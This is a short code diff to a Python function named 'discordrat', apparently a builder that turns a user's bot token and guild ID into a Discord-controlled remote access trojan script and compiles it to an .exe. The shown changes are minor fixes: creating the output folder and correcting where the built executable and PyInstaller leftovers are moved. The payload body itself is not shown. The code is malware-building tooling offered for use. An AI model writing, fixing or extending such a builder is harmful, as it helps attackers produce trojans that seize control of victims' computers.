@@ -16,7 +16,6 @@ def discordrat():
             sys.stdout.flush()
             time.sleep(0.2)
 
-    clear()
     print(f"""Enter the name you want to give to the final file: """)
     global filename
     fileName = str(input(f"""File name: """))
@@ -27,7 +26,9 @@ def discordrat():
     guildid = str(input(f"""Guild ID: """))
     print('\n')
     spinner()
-
+    if not os.path.exists("output"):
+        os.makedirs("output")
+        
     try:
         with open(f"output/{fileName}.py", "w") as file:
             file.write("""import discord 
@@ -643,8 +644,8 @@ client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid +
                 import shutil
                 os.remove(f"{fileName}.spec")
                 shutil.rmtree(f"build")
-                shutil.move(f"dist/{fileName}.exe", "output")
-                shutil.rmtree(f"dist")
+                shutil.move(f"output/dist/{fileName}.exe", "output")
+                shutil.rmtree(f"output/dist")
                 time.sleep(1)
             except:
                 pass
